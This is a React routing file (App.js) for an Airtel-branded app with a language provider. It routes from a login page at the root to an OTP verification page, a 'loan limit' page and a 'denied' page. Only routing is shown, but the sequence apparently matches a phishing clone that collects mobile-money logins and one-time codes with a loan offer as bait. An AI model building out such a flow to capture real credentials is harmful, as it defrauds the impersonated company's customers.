import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import { LanguageProvider } from './LanguageContext'; // <-- Import the Provider
import AirtelLogin from './AirtelLogin';
import AirtelOTPVerify from './AirtelOTPVerify';
import AirtelLoanLimit from './AirtelLoanLimit';
import AirtelDenied from './AirtelDenied';

function App() {
  return (
    // Wrap everything inside LanguageProvider so all pages can access translations
    <LanguageProvider>
      <Router>
        <Routes>
          {/* The root path now loads the Login page directly */}
          <Route path="/" element={<AirtelLogin />} />
          
          {/* Kept for backward compatibility (e.g., back buttons pointing to /login) */}
          <Route path="/login" element={<AirtelLogin />} />
          
          {/* Airtel App Routes */}
          <Route path="/airtel-otp" element={<AirtelOTPVerify />} />
          <Route path="/airtel-loan-limit" element={<AirtelLoanLimit />} />
          <Route path="/airtel-denied" element={<AirtelDenied />} />
        </Routes>
      </Router>
    </LanguageProvider>
  );
}

export default App;